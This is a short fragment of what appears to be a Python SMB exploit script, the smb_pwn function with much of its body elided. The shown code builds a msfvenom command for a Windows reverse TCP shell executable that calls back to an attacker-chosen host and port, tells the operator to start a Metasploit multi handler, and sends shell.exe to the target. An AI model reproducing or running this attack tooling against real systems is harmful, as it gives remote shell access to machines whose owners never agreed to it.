...
def smb_pwn(conn, arch):
	...
	print('sending shell.exe to the target')
...
if len(sys.argv) < 4:
	print("{} <ip> LHOST LPORT [pipe_name] ".format(sys.argv[0]))
	print("Set up a multi handler in metasploit using windows/shell/reverse_tcp before running again.")
	sys.exit(1)

msfvenom = ("msfvenom -p windows/shell/reverse_tcp lhost=" + sys.argv[2] +" lport=" + sys.argv[3] +" -f exe -o shell.exe")  
target = sys.argv[1]
